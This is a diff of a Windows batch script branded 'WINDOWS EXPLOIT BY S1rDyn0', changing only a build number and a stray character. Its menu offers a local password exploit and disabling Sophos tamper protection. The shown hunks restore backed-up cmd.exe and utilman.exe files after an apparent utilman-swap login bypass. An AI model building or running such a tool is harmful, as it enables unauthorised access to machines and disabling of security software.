@@ -23,7 +23,7 @@ cls
 echo ^|==============================^|
 echo ^|  WINDOWS EXPLOIT BY S1rDyn0  ^|
 echo ^|                              ^|
-echo ^|  BUILD               23.5.4  ^|
+echo ^|  BUILD               23.5.6  ^|
 echo ^|==============================^| & echo: & echo:
 echo ^[1^] Local Password Exploit
 echo ^[2^] Disable Sophos Tamper Protection
@@ -146,7 +146,7 @@ if %crackType% EQU 5 (
   echo Preparing restore...
   if /i exist "x:\sources\restore" ( echo Located restore folder ) else ( echo Could not find Restore Folder... & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
   if /i exist "x:\sources\restore\cmd.exe" ( echo Command Prompt backup found ) else ( echo Could not find Command Prompt backup... & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
-  if /i exist "x:\sources\restore\utilman.exe" ( echo Utilman backup found ) else ( echo Could not find Utilman backup... & echo: & echo Failing Exploit and returning to menu & pause & goto menu )#
+  if /i exist "x:\sources\restore\utilman.exe" ( echo Utilman backup found ) else ( echo Could not find Utilman backup... & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
 
   echo Restore files found! & echo: & echo Checking System files...
   if /i exist "c:\windows\system32" ( echo Located System folder ) else ( echo Could not find System Folder... & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
@@ -171,7 +171,7 @@ if %crackType% EQU 6 (
   echo Preparing restore...
   if /i exist "x:\sources\restore" ( echo Located restore folder ) else ( echo Could not find Restore Folder... & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
   if /i exist "x:\sources\restore\cmd.exe" ( echo Command Prompt backup found ) else ( echo Could not find Command Prompt backup... & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
-  if /i exist "x:\sources\restore\utilman.exe" ( echo Utilman backup found ) else ( echo Could not find Utilman backup... & echo: & echo Failing Exploit and returning to menu & pause & goto menu )#
+  if /i exist "x:\sources\restore\utilman.exe" ( echo Utilman backup found ) else ( echo Could not find Utilman backup... & echo: & echo Failing Exploit and returning to menu & pause & goto menu )
   
   echo Backup files located! & echo: & echo Starting restore...
   echo Deleting exploited utilman.exe
